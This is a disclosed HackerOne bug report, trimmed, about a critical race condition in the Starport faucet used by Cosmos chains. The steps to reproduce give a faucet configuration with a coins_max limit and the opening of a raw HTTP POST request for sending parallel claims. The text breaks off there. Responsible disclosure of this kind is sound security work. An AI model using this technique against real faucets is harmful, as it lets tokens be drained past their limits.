# [C] Race condition in faucet when using starport

## Summary
Severity: Critical (CVSS 9.3)
Program: Cosmos
Weakness: N/A
Reporter: cyberboy
State: resolved
Disclosed: 2022-07-26T17:47:40.549Z
Source: https://hackerone.com/reports/1438052

## Details
Hi team, 
I and Aditya sent this bug over email on Wed, 29 Dec, 17:45 IST. Later we noticed that security reports are accepted via the HackerOne program. So, I am sending a copy of the bug report here. 

## Summary:
We were testing an application and we found a race condition bug in the faucet Implementation of Starport. 
https://github.com/tendermint/starport

## Steps To Reproduce:
1. Start a starport with the below configuration. Note the "coins_max" has been set to 11 tokens and hence a user cannot fetch more after the 11 token limits.

```
accounts:
  - name: alice
    coins: ["0token", "200000000stake"]
  - name: bob
    coins: ["500token", "100000000stake"]
validator:
  name: alice
  staked: "100000000stake"
client:
  openapi:
    path: "docs/static/openapi.yml"
  vuex:
    path: "vue/src/store"
faucet:
  name: bob
  coins: ["5token", "100000stake"]  
  coins_max: ["11token", "100000stake"]
```

2. Now call the request manually  with 5 tokens per request as in our configuration after 2 requests and 10 tokens in total Alice won't be able to fetch more tokens from the faucet

```
POST / HTTP/1.1
Host: 172.105.41.242:4500
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:95.0) Gecko/20100101 Firefox/95.0
Accept: application/json
Accept-Language: en-US,en;q=0.5
```

_Trimmed to 38 lines — full report: https://hackerone.com/reports/1438052_
